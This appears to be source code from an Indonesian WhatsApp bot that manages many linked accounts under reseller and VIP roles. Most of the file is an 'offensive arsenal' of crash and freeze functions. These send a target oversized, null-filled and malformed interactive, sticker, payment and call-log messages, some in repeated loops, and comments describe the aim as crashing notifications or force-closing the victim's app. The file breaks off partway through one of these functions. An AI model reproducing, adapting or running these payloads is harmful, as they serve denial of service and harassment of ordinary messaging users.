const fs = require('fs');
const path = require('path');
const { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    generateWAMessageFromContent, 
    prepareWAMessageMedia, 
    proto, 
    jidEncode, 
    jidDecode, // Perbaikan: huruf kecil
    encodeWAMessage, 
    encodeSignedDeviceIdentity 
} = require("@bellachu/baileys");
const pino = require('pino');
const { logger } = require('../utils/logger');
// Pastikan path databaseService sesuai dengan struktur folder Anda
// const { loadKeyList, saveKeyList } = require('./databaseService'); 
const { safeStringify } = require('../utils/serialize_helper');
const crypto = require('crypto');

// Global State
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// ==========================================
// HELPER FUNCTIONS
// ==========================================

// Cek Role (Termasuk High Owner)
function isVipOrOwner(user) {
  return user && ["vip", "owner", "high admin", "admin", "reseller", "reseller1", "dev", "ceo"].includes(user.role);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==========================================
// SESSION MANAGEMENT: VIP
// ==========================================

function getVipSessionPath(sessionName) {
  return path.join('./vip', sessionName);
}

function prepareVipSessionFolders() {
  const vipFolder = './vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
      logger.info("Folder session VIP dibuat.");
    }

    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      // logger.info("Folder session VIP kosong.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      
      // Copy creds jika belum ada di folder session
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Error menyiapkan folder session VIP:", err.message);
    return [];
  }
}

async function connectVipSession(sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"], // Browser spoofing agar lebih stabil
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          logger.info(`[VIP ${sessionName}] Terhubung ✅`);

          const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.warn(`[VIP ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
             logger.error(`[VIP ${sessionName}] Session Invalid/Overwrite.`);
             delete activeConnections[sessionName];
             // Hati-hati menghapus folder otomatis, opsional:
             // fs.rmSync(sessionPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectVipSession(sessionName, retries - 1));
          } else {
            logger.error(`[VIP ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[VIP ${sessionName}] Gagal memuat: ${err.message}`);
      resolve();
    }
  });
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[VIP] Memulai ${files.length} session VIP/Owner...`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectVipSession(baseName);
  }
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
}

function isVipSession(sessionName) {
  return fs.existsSync(getVipSessionPath(sessionName));
}

function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  if (sessionNames.length === 0) return null;
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// ==========================================
// SESSION MANAGEMENT: REGULAR (MEMBER)
// ==========================================

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      // logger.warn("Folder '" + userId + "' belum ada session.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error prepareAuthFolders: " + err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = path.join(folderPath, sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          logger.info(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logger.info(`[${sessionName}] Logged out.`);
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true }); // Hapus folder jika logout
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[${sessionName}] Error: ${err.message}`);
      resolve();
    }
  });
}

// Check Active Session Priority (VIP First for High Owner/Owner/VIP)
function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  // 1. Prioritas VIP/High Owner/Owner
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);
    
    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      return vipConnections[randomSession];
    }
  }
  
  // 2. Fallback ke session biasa (folder permenmd)
  const folderPath = path.join('permenmd', subfolderName);
  if (fs.existsSync(folderPath)) {
    const entries = fs.readdirSync(folderPath);
    for (const entry of entries) {
      const fullPath = path.join(folderPath, entry);
      let isDir = false;
      try { isDir = fs.lstatSync(fullPath).isDirectory(); } catch (_) {}
      const sessionKey = isDir
        ? `${subfolderName}_${entry}`
        : (entry.endsWith('.json') ? `${subfolderName}_${path.basename(entry, '.json')}` : null);
      if (!sessionKey) continue;
      const sock = activeConnections[sessionKey] || activeConnections[path.basename(entry, '.json')];
      if (sock && sock.user) return sock;
    }
  }

  // 3. Tidak ada session milik user sendiri
  logger.warn(`[❌ SESSION] Tidak ada private sender untuk user ${subfolderName}`);
  return null;
}

async function startUserSessions() {
  try {
    // 1. Start VIP Sessions First
    await startVipSessions();

    // 2. Start Member Sessions
    if (!fs.existsSync('permenmd')) {
        fs.mkdirSync('permenmd');
    }

    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => fs.statSync(p).isDirectory());

    logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder member di 'permenmd'`);

    for (const folder of subfolders) {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          continue;
        }

        // Jalankan session member
        // Tidak perlu await agar paralel dan lebih cepat startnya
        connectSession(folder, sessionName).catch(err => {
             logger.error(`Gagal start session member ${sessionName}: ${err.message}`);
        });
      }
    }
  } catch (err) {
    logger.error("Fatal error in startUserSessions: " + err.message);
  }
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logger.info(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
    }
    delete activeConnections[sessionName];
  }
  logger.info('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

// ==========================================
// BUG & ATTACK FUNCTIONS (Use with Caution)
// ==========================================
// ... (Bagian atas file tetap sama hingga Helper Functions)

// ==========================================
// ARSENAL OFENSIF VVIP (CRASH & FC)
// ==========================================

/**
 * [1] CRASH NOTIFIKASI
 * Target: Android/iOS Notification Manager.
 * Mekanisme: Eksploitasi buffer overflow pada rendering pratinjau PaymentInvite.
 */
 async function delayspam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
async function DelayHardV5(target) {
const Miamiaw = "\u0000".repeat(900);
// jangan di hapus nanti error 
const Nandok = "999999999999";
// jangan di hapus nanti error 
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
const QueenMia = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: Miamiaw,
          name: Miamiaw,
          publisher: Miamiaw,
          fileLength: Nandok,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",

          contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 899099}@s.whatsapp.net`
            }))
          },
         },
        }
      }
    }
  };

  await sock.relayMessage(target, QueenMia, {
    participant: { jid: target }
  });
}
}
async function DelayBuldoBlankByMia(target) {
const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}
async function VnXdelayJmbd(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: 10610,
            mediaKeyTimestamp: 1775044724,
            stickerSentTs: 1775044724091,

            contextInfo: {
              isForwarded: true,
              forwardingScore: 9999999,
              pairedMediaType: 1,
              statusSourceType: 1,
              statusAttributionType: 2,

              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 250000 }, () => ({}))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    });

    await new Promise(r => setTimeout(r, 1500));

  } catch (err) {
    console.error("Error:", err);

    await new Promise(r => setTimeout(r, 5000));
  }
}
   async function gladiatorBlankV2(sock, target) {
  await sock.relayMessage(target, {
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0
            },
            hasMediaAttachment: true
          },
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ꦽ".repeat(50000) + "ꦾ".repeat(50000) + "@1".repeat(50000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@s.whatsapp.net"),
            groupMentions: [{ groupJid: "1@s.whatsapp.net", groupSubject: "Zoo" }]
          }
        }
      }
    }
  }, { participant: { jid: target } }, { messageId: null });

  await sock.relayMessage(target, {
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0
            },
            hasMediaAttachment: true
          },
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ꦾ".repeat(100000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
            groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Zoo" }]
          }
        }
      }
    }
  }, { participant: { jid: target } }, { messageId: null });

  await sock.relayMessage(target, {
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "99999999999",
              pageCount: 0x9184e729fff,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: "𝗦𝗸𝘆𝘇𝗼𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
              mediaKeyTimestamp: "1715880173",
              contactVcard: true
            },
            hasMediaAttachment: true
          },
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ꦾ".repeat(50000) + "@1".repeat(50000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗦𝗸𝘆𝘇𝗼" }]
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await sock.relayMessage(target, {
    groupMentionedMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
              fileLength: "99999999999",
              pageCount: 0x9184e729fff,
              mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
              fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
              fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
              directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
              mediaKeyTimestamp: "1715880173",
              contactVcard: true
            },
            hasMediaAttachment: true
          },
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ꦾ".repeat(50000) + "@1".repeat(50000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝗦𝗸𝘆𝘇𝗼" }]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}
async function gladiatorBlankV1(sock, target) {
  const btns = [];
  btns.push({
    name: "single_select",
    buttonParamsJson: JSON.stringify({})
  });
  
  for (let i = 0; i < 20000; i++) {
    btns.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({ status: true })
    });
  }

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: btns
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩".repeat(50000) + "ꦽ".repeat(50000),
        contentText: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩".repeat(50000) + "ꦾ".repeat(50000),
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          urlTrackingMap: {
            urlTrackingMapElements: [
              {
                originalUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                unconsentedUsersUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                consentedUsersUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                cardIndex: 1,
              }
            ],
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "\u0000".repeat(5000),
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "{\"state\":\"" + "\u0000".repeat(900000) + "\"}",
                version: 3
              }
            }
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
            locationMessage: {
              degreesLatitude: 9.99999,
              degreesLongitude: -9.99999,
            },
            hasMediaAttachment: false,
          },
          extendedTextMessage: {
            text: "ꦽ".repeat(50000) + "ោ៝".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "0@newsletter",
      newsletterName: "ោ៝".repeat(25000),
      caption: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(25000) + "ោ៝".repeat(25000),
      inviteExpiration: "90000",
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });
}
async function DelayFreezeByMia(sock, target) {
  try {
    const miasimanis = {
      groupStatusMessageV2: {
        message: {
          albumMessage: {
            expectedImageCount: 100,
            collectionId: "Queen Mia Nih Bosh",
            title: "Queen Mia Nih Bosh" + "‎".repeat(50000),
            contextInfo: {
              remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
              isForwarded: true,
              forwardingScore: 9999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                  participant: `62${z + 899099}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, miasimanis, {
      participant: { jid: target }
    });

    console.log("Queen Mia succesful send to: " + target);
  } catch (err) {
    console.log(err.message);
  }
}
async function crashNotificationVVIP(sock, target) {
    const payload = "ꦾ".repeat(65000); // Ukuran optimasi anti-socket-closed
    try {
        if (!sock || sock.ws.readyState !== 1) return;

        const msg = {
            viewOnceMessage: {
                message: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: 999999999999999, 
                        noteMessage: {
                            extendedTextMessage: {
                                text: `‼️⃟ ༚ ./𝐃𝐚𝐫𝐤-𝐀𝐢.𝐯𝐯𝐢𝐩   ${payload}`,
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555${i}@s.whatsapp.net`),
                                    externalAdReply: {
                                        showAdAttribution: true,
                                        title: payload,
                                        mediaType: 1,
                                        thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                                        sourceUrl: "https://t.me/CRPTZDX"
                                    },
                                    forwardingScore: 999,
                                    isForwarded: true
                                }
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, { 
            participant: { jid: target }, 
            messageId: sock.generateMessageTag() 
        });
        logger.info(`[🚀] Notification Crash dikirim ke ${target}`);
    } catch (err) {
        logger.error(`[❌] Gagal kirim Notif Crash: ${err.message}`);
    }
}

async function DelayBuldoHardFreezeByMia(sock, target) {
const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "# - D̶o̶ Y̶o̶u̶ K̶n̶o̶w̶ M̶i̶a̶?̶ Y̶e̶a̶h̶ I̶a̶m̶ M̶i̶a̶ 🤪",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "flow_message",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}

async function uno(sock, target) {
     const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "AYAM" + "ោ៝".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "\u0000".repeat(20000),
                            },
                        ],
                    },
                },
            },
        },
        {}
    );
    
    const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "DRAPOK",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -929.03499999999999,
                                degreesLongitude: 992.999999999999,
                                name: "ZERO",
                                address: "ោ៝".repeat(1000),
                            },
                        },
                        body: {
                            text: "HELLO".repeat(20000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
    });

    await sock.relayMessage(target, msg2.message, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
}

/**
 * [3] FORCE CLOSE (MENTAL)
 * Target: Memory Heap / Dalvik VM.
 * Mekanisme: Heap overflow via malformed CallLog participants array.
 */
async function forceCloseMentalVVIP(sock, target) {
    const trigger = "ꦾ".repeat(55000); 
    try {
        if (!sock || sock.ws.readyState !== 1) return;

        const msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            quotedMessage: {
                                callLogMessage: {
                                    isVideo: false,
                                    callOutcome: "ONGOING",
                                    durationSecs: "0",
                                    callType: "VOICE_CHAT",
                                    participants: Array.from({ length: 8000 }, () => ({
                                        jid: `1${Math.floor(Math.random() * 9999999)}@s.whatsapp.net`,
                                        callOutcome: "CONNECTED"
                                    }))
                                }
                            },
                            externalAdReply: {
